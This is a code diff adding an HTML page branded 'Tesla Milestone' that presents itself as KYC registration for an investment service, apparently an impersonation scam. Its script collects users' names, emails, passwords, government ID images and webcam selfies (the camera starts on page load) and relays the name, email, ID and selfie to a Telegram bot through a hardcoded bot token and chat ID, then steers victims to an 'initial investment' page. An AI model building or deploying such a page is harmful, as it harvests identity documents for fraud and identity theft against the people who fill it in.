@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tesla Milestone | Client KYC Registration</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        body { background-color: #f4f4f5; color: #18181b; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        .tesla-card { background: #ffffff; border: 1px solid #e4e4e7; box-shadow: 0 4px 20px -2px rgba(0, 0, 0, 0.04); }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+
+    <div class="max-w-md w-full space-y-6">
+        
+        <div class="text-center space-y-2">
+            <div class="w-12 h-12 bg-zinc-900 text-white rounded-2xl flex items-center justify-center font-black text-xl mx-auto shadow-md">T</div>
+            <h1 class="font-extrabold text-zinc-900 text-xl tracking-tight">TESLA MILESTONE</h1>
+            <p class="text-xs text-zinc-500">Mandatory Client Identification & Setup</p>
+        </div>
+
+        <div class="tesla-card rounded-2xl p-8 space-y-6">
+            <div class="space-y-1">
+                <h2 class="font-bold text-zinc-900 text-base flex items-center">
+                    <i data-lucide="shield-check" class="w-4 h-4 mr-2 text-emerald-600"></i> Secure KYC Registration
+                </h2>
+                <p class="text-xs text-zinc-500">Details lock permanently upon submission and link directly to your auth account.</p>
+            </div>
+
+            <form onsubmit="submitKYC(event)" class="space-y-4">
+                <div>
+                    <label class="block text-[10px] font-bold uppercase tracking-wider text-zinc-600 mb-1">Full Legal Name</label>
+                    <input type="text" id="kyc-name" required placeholder="John Doe" class="w-full px-4 py-2.5 rounded-xl border border-zinc-200 text-xs bg-zinc-50 outline-none">
+                </div>
+                <div>
+                    <label class="block text-[10px] font-bold uppercase tracking-wider text-zinc-600 mb-1">Email Address (Login ID)</label>
+                    <input type="email" id="kyc-email" required placeholder="client@example.com" class="w-full px-4 py-2.5 rounded-xl border border-zinc-200 text-xs bg-zinc-50 outline-none">
+                </div>
+                <div>
+                    <label class="block text-[10px] font-bold uppercase tracking-wider text-zinc-600 mb-1">Secure Password</label>
+                    <input type="password" id="kyc-password" required minlength="6" placeholder="At least 6 characters" class="w-full px-4 py-2.5 rounded-xl border border-zinc-200 text-xs bg-zinc-50 outline-none">
+                </div>
+                <div>
+                    <label class="block text-[10px] font-bold uppercase tracking-wider text-zinc-600 mb-1">Government ID (Image / PDF)</label>
+                    <input type="file" id="kyc-id-file" accept="image/*" required class="w-full text-xs text-zinc-500 file:mr-4 file:py-2 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-zinc-100 file:text-zinc-700 hover:file:bg-zinc-200 cursor-pointer">
+                </div>
+
+                <!-- Live Selfie Camera Module -->
+                <div class="space-y-2 border border-zinc-200 p-3 rounded-xl bg-zinc-50">
+                    <label class="block text-[10px] font-bold uppercase tracking-wider text-zinc-600">Live Selfie Capture</label>
+                    <div class="relative w-full h-40 bg-black rounded-lg overflow-hidden flex items-center justify-center">
+                        <video id="webcam" autoplay playsinline class="w-full h-full object-cover"></video>
+                        <canvas id="selfie-canvas" class="hidden"></canvas>
+                        <img id="selfie-preview" class="w-full h-full object-cover hidden" alt="Captured Selfie">
+                    </div>
+                    <div class="flex gap-2">
+                        <button type="button" onclick="startCamera()" class="flex-1 py-1.5 bg-zinc-200 hover:bg-zinc-300 text-zinc-800 rounded-lg text-[11px] font-bold">Turn Camera On</button>
+                        <button type="button" onclick="takeSnapshot()" class="flex-1 py-1.5 bg-zinc-900 hover:bg-zinc-800 text-white rounded-lg text-[11px] font-bold">Capture Selfie</button>
+                    </div>
+                </div>
+
+                <button type="submit" id="submit-kyc-btn" class="w-full py-3 bg-emerald-600 hover:bg-emerald-700 text-white font-bold rounded-xl text-xs transition shadow-sm">
+                    Proceed to Initial Investment
+                </button>
+            </form>
+        </div>
+
+    </div>
+
+    <!-- Firebase Auth & Telegram Relay Script -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.19.0/firebase-app.js";
+        import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/12.19.0/firebase-auth.js";
+        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/12.19.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAmPw9jUbbvorS-9V9y_uIIivOl5Y92hBY",
+            authDomain: "teslamilestone-6ce77.firebaseapp.com",
+            projectId: "teslamilestone-6ce77",
+            storageBucket: "teslamilestone-6ce77.firebasestorage.app",
+            messagingSenderId: "603266005390",
+            appId: "1:603266005390:web:219be0276e2ac5db068cdf",
+            measurementId: "G-7HLBL47YTT"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        const TELEGRAM_BOT_TOKEN = "8630191514:AAHnhtahysDQC4wGpA3HW7FiAjjnWRCv9Fk";
+        const TELEGRAM_CHAT_ID = "8696262458";
+
+        let capturedSelfieBlob = null;
+
+        window.addEventListener('DOMContentLoaded', () => {
+            if(localStorage.getItem('tesla_invite_verified') !== 'true') {
+                window.location.href = 'index.html';
+            }
+            startCamera();
+        });
+
+        window.startCamera = async function() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('webcam').srcObject = stream;
+            } catch(err) {
+                console.warn("Camera auto-start skipped.");
+            }
+        }
+
+        window.takeSnapshot = function() {
+            const video = document.getElementById('webcam');
+            const canvas = document.getElementById('selfie-canvas');
+            const preview = document.getElementById('selfie-preview');
+            
+            if(!video.srcObject) {
+                alert("Please enable and start your camera first.");
+                return;
+            }
+
+            canvas.width = video.videoWidth || 320;
+            canvas.height = video.videoHeight || 240;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob((blob) => {
+                capturedSelfieBlob = blob;
+                preview.src = URL.createObjectURL(blob);
+                preview.classList.remove('hidden');
+                video.classList.add('hidden');
+                alert("Selfie captured successfully!");
+            }, 'image/jpeg');
+        }
+
+        window.submitKYC = async function(e) {
+            e.preventDefault();
+            if(!capturedSelfieBlob) {
+                alert("Please capture a live webcam selfie before submitting.");
+                return;
+            }
+
+            const name = document.getElementById('kyc-name').value.trim();
+            const email = document.getElementById('kyc-email').value.trim().toLowerCase();
+            const password = document.getElementById('kyc-password').value;
+            const idFile = document.getElementById('kyc-id-file').files[0];
+
+            const btn = document.getElementById('submit-kyc-btn');
+            btn.innerText = "Creating Account & Notifying Telegram...";
+            btn.disabled = true;
+
+            try {
+                // 1. Create User Account in Firebase Auth
+                const userCredential = await createUserWithEmailAndPassword(auth, email, password);
+                const user = userCredential.user;
+
+                // 2. Dispatch Telegram Notifications
+                const msg = `🚨 *NEW CLIENT KYC SUBMISSION* 🚨\n\n*Name:* ${name}\n*Email:* ${email}\n*Status:* Pending Approval`;
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                });
+
+                const idFormData = new FormData();
+                idFormData.append('chat_id', TELEGRAM_CHAT_ID);
+                idFormData.append('document', idFile, 'Government_ID');
+                idFormData.append('caption', `ID Document for ${name} (${email})`);
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: 'POST', body: idFormData });
+
+                const selfieFormData = new FormData();
+                selfieFormData.append('chat_id', TELEGRAM_CHAT_ID);
+                selfieFormData.append('photo', capturedSelfieBlob, 'Selfie.jpg');
+                selfieFormData.append('caption', `Live Selfie for ${name} (${email})`);
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: selfieFormData });
+
+                // 3. Save Permanent Locked Record in Firestore
+                const docRef = doc(db, "clients", user.uid);
+                await setDoc(docRef, {
+                    uid: user.uid,
+                    name: name,
+                    email: email,
+                    kycStatus: "Pending Approval",
+                    investedPrincipal: 0,
+                    transactions: [],
+                    createdAt: new Date().toISOString()
+                });
+
+                // Set session cache
+                localStorage.setItem('tesla_client_name', name);
+                localStorage.setItem('tesla_client_email', email);
+                localStorage.setItem('tesla_client_uid', user.uid);
+                localStorage.setItem('tesla_invested', '0');
+                localStorage.setItem('tesla_kyc_completed', 'true');
+
+                // Redirect NEW users to invest.html instead of dashboard.html
+                window.location.href = 'invest.html';
+
+            } catch (err) {
+                console.error(err);
+                alert("Error: " + err.message);
+                btn.innerText = "Proceed to Initial Investment";
+                btn.disabled = false;
+            }
+        }
+    </script>
+    <script>lucide.createIcons();</script>
+</body>
+</html>
